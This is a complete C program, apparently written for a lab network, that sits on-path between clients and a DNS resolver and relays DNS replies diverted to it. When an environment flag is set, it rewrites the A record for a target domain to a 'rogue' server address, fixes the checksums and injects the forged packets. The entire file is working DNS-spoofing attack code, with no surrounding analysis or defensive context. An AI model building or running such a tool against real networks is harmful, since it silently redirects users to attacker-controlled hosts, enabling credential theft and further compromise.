/*
 * On-path DNS interceptor. Relays the resolver's diverted replies; with FORGE=1
 * it rewrites the A answer for example.com to the rogue server. libpcap only.
 * Build: cc -O2 -Wall -o interceptor interceptor.c -lpcap
 */
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>

#define IFACE       "eth0"
#define ATTACKER_IP "172.16.1.100"  
#define RESOLVER_IP "172.16.1.10"   
#define ROGUE_IP    "172.16.1.30"
#define TARGET      "example.com"

struct eth_h { uint8_t dst[6], src[6]; uint16_t type; } __attribute__((packed));
struct ip_h  { uint8_t ihl_ver, tos; uint16_t tot_len, id, frag;
               uint8_t ttl, proto; uint16_t check; uint32_t saddr, daddr; } __attribute__((packed));
struct udp_h { uint16_t sport, dport, len, check; } __attribute__((packed));
struct dns_h { uint16_t id, flags, qd, an, ns, ar; } __attribute__((packed));

static uint8_t  own_mac[6], res_mac[6];
static uint32_t resolver_ip, rogue_ip;
static int      forge = 0, have_res_mac = 0;

static void get_own_mac(const char *ifn) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr; memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, ifn, IFNAMSIZ - 1);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy(own_mac, ifr.ifr_hwaddr.sa_data, 6);
    close(s);
}

/* ARP for the resolver's MAC */
static void send_arp_request(pcap_t *h) {
    uint8_t f[42];
    struct eth_h *e = (struct eth_h *)f;
    memset(e->dst, 0xff, 6); memcpy(e->src, own_mac, 6); e->type = htons(0x0806);
    uint8_t *a = f + 14;
    a[0]=0;a[1]=1; a[2]=8;a[3]=0; a[4]=6; a[5]=4; a[6]=0;a[7]=1;
    memcpy(a + 8, own_mac, 6);
    uint32_t me = inet_addr(ATTACKER_IP); memcpy(a + 14, &me, 4);
    memset(a + 18, 0, 6);
    memcpy(a + 24, &resolver_ip, 4);
    pcap_inject(h, f, sizeof f);
}

/* learn the resolver's MAC from its ARP reply */
static int learn_arp(const u_char *p) {
    const struct eth_h *e = (const struct eth_h *)p;
    if (ntohs(e->type) != 0x0806) return 0;
    const uint8_t *a = p + 14;
    if (a[6] == 0 && a[7] == 2 && memcmp(a + 14, &resolver_ip, 4) == 0) {
        memcpy(res_mac, a + 8, 6); have_res_mac = 1; return 1;
    }
    return 0;
}

/* skip a DNS name, return the offset past it */
static int skip_name(const uint8_t *d, int off, int len) {
    while (off < len) {
        uint8_t l = d[off];
        if (l == 0) return off + 1;
        if ((l & 0xC0) == 0xC0) return off + 2;
        off += l + 1;
    }
    return off;
}

/* read a DNS name into dotted text, return the offset past it */
static int read_name(const uint8_t *d, int off, int len, char *out, int osz) {
    int o = 0, end = -1, hops = 0;
    while (off < len && hops < 20) {
        uint8_t l = d[off];
        if (l == 0) { off++; break; }
        if ((l & 0xC0) == 0xC0) {
            if (end < 0) end = off + 2;
            off = ((l & 0x3F) << 8) | d[off + 1]; hops++; continue;
        }
        off++;
        for (int i = 0; i < l && off < len; i++) { if (o < osz-1) out[o++] = d[off]; off++; }
        if (o < osz-1) out[o++] = '.';
    }
    if (o && out[o-1] == '.') o--;
    out[o] = 0;
    return end >= 0 ? end : off;
}

static uint16_t ip_checksum(struct ip_h *ip) {
    int ihl = (ip->ihl_ver & 0x0f) * 4;
    ip->check = 0;
    uint32_t sum = 0;
    const uint8_t *p = (const uint8_t *)ip;
    for (int i = 0; i + 1 < ihl; i += 2) sum += (p[i] << 8) | p[i + 1];
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return htons(~sum & 0xffff);
}

static uint16_t udp_checksum(struct ip_h *ip, struct udp_h *udp) {
    uint16_t ulen = ntohs(udp->len);
    uint32_t sum = 0;
    const uint8_t *s = (const uint8_t *)&ip->saddr;
    const uint8_t *d = (const uint8_t *)&ip->daddr;
    sum += (s[0] << 8) | s[1]; sum += (s[2] << 8) | s[3];
    sum += (d[0] << 8) | d[1]; sum += (d[2] << 8) | d[3];
    sum += 17;                            /* UDP pseudo-header */
    sum += ulen;
    udp->check = 0;
    const uint8_t *p = (const uint8_t *)udp;
    for (int i = 0; i + 1 < ulen; i += 2) sum += (p[i] << 8) | p[i + 1];
    if (ulen & 1) sum += p[ulen - 1] << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    uint16_t r = ~sum;
    return htons(r ? r : 0xffff);
}

int main(void) {
    const char *fe = getenv("FORGE");
    forge = fe && atoi(fe);
    resolver_ip = inet_addr(RESOLVER_IP);
    rogue_ip    = inet_addr(ROGUE_IP);

    char err[PCAP_ERRBUF_SIZE];
    pcap_t *h = pcap_open_live(IFACE, 65535, 0, 10, err);   /* promisc off: diverted frames are unicast to us */
    if (!h) { fprintf(stderr, "pcap_open_live: %s\n", err); return 1; }
    get_own_mac(IFACE);

    /* diverted DNS replies to the resolver, plus its ARP replies */
    char filt[256];
    snprintf(filt, sizeof filt,
        "(ether dst %02x:%02x:%02x:%02x:%02x:%02x and udp and src port 53 and dst host %s)"
        " or (arp and src host %s)",
        own_mac[0],own_mac[1],own_mac[2],own_mac[3],own_mac[4],own_mac[5],
        RESOLVER_IP, RESOLVER_IP);
    struct bpf_program bp;
    if (pcap_compile(h, &bp, filt, 1, PCAP_NETMASK_UNKNOWN) != 0 || pcap_setfilter(h, &bp) != 0) {
        fprintf(stderr, "filter: %s\n", pcap_geterr(h)); return 1;
    }

    /* resolve the resolver's MAC before relaying */
    for (int i = 0; i < 50 && !have_res_mac; i++) {
        send_arp_request(h);
        time_t t0 = time(NULL);
        while (time(NULL) - t0 < 1 && !have_res_mac) {
            struct pcap_pkthdr *hd; const u_char *p;
            if (pcap_next_ex(h, &hd, &p) == 1) learn_arp(p);
        }
    }
    if (!have_res_mac) { fprintf(stderr, "could not ARP-resolve resolver %s\n", RESOLVER_IP); return 1; }
    fprintf(stderr, "interceptor up: FORGE=%d, resolver %s at %02x:%02x:%02x:%02x:%02x:%02x\n",
            forge, RESOLVER_IP, res_mac[0],res_mac[1],res_mac[2],res_mac[3],res_mac[4],res_mac[5]);

    static uint8_t buf[65535];
    struct pcap_pkthdr *hd; const u_char *pkt;
    time_t last_arp = time(NULL);
    for (;;) {
        time_t now = time(NULL);
        if (now - last_arp >= 1) { send_arp_request(h); last_arp = now; }  /* keep MAC fresh */

        int r = pcap_next_ex(h, &hd, &pkt);
        if (r != 1) continue;
        if (learn_arp(pkt)) continue;

        memcpy(buf, pkt, hd->caplen);
        if (hd->caplen >= 14 + 20 + 8 + 12) {
            struct ip_h  *ip  = (struct ip_h *)(buf + 14);
            int iphl = (ip->ihl_ver & 0x0f) * 4;
            struct udp_h *udp = (struct udp_h *)(buf + 14 + iphl);
            uint8_t *dns = (uint8_t *)udp + 8;
            int dnslen = ntohs(udp->len) - 8;
            struct dns_h *dh = (struct dns_h *)dns;

            char qname[256]; qname[0] = 0;
            int off = read_name(dns, 12, dnslen, qname, sizeof qname);
            uint16_t qtype = (off + 2 <= dnslen) ? ntohs(*(uint16_t *)(dns + off)) : 0;

            if (forge && qtype == 1 && strcasecmp(qname, TARGET) == 0 && ntohs(dh->an) > 0) {
                off += 4;                               /* past qtype + qclass */
                int an = ntohs(dh->an);
                for (int i = 0; i < an && off < dnslen; i++) {
                    int ne = skip_name(dns, off, dnslen);
                    if (ne + 10 > dnslen) break;
                    uint16_t type  = ntohs(*(uint16_t *)(dns + ne));
                    uint16_t rdlen = ntohs(*(uint16_t *)(dns + ne + 8));
                    if (type == 1 && rdlen == 4) memcpy(dns + ne + 10, &rogue_ip, 4);  /* swap A */
                    off = ne + 10 + rdlen;
                }
                fprintf(stderr, "FORGED %s A -> %s\n", qname, ROGUE_IP);
            } else {
                fprintf(stderr, "relay  %s type=%u\n", qname[0]?qname:"?", qtype);
            }
            /* recompute every time: offloaded checksums off the bridge are stale */
            ip->check  = ip_checksum(ip);
            udp->check = udp_checksum(ip, udp);
        }

        struct eth_h *e = (struct eth_h *)buf;          /* relay to the resolver */
        memcpy(e->dst, res_mac, 6);
        memcpy(e->src, own_mac, 6);
        if (pcap_inject(h, buf, hd->caplen) < 0) pcap_perror(h, "inject");
    }
}
